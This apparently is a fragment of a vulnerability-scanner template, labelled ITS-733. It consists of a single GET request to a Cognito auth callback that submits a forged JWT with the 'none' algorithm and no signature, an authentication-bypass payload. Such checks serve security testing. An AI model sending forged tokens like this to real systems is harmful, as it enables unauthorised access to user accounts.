# Vulnerable: ITS-733
GET /api/auth/cognito/callback?access_token={{to_lower(rand_text_alpha(8))}}&id_token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.{{base64(payload)}}.
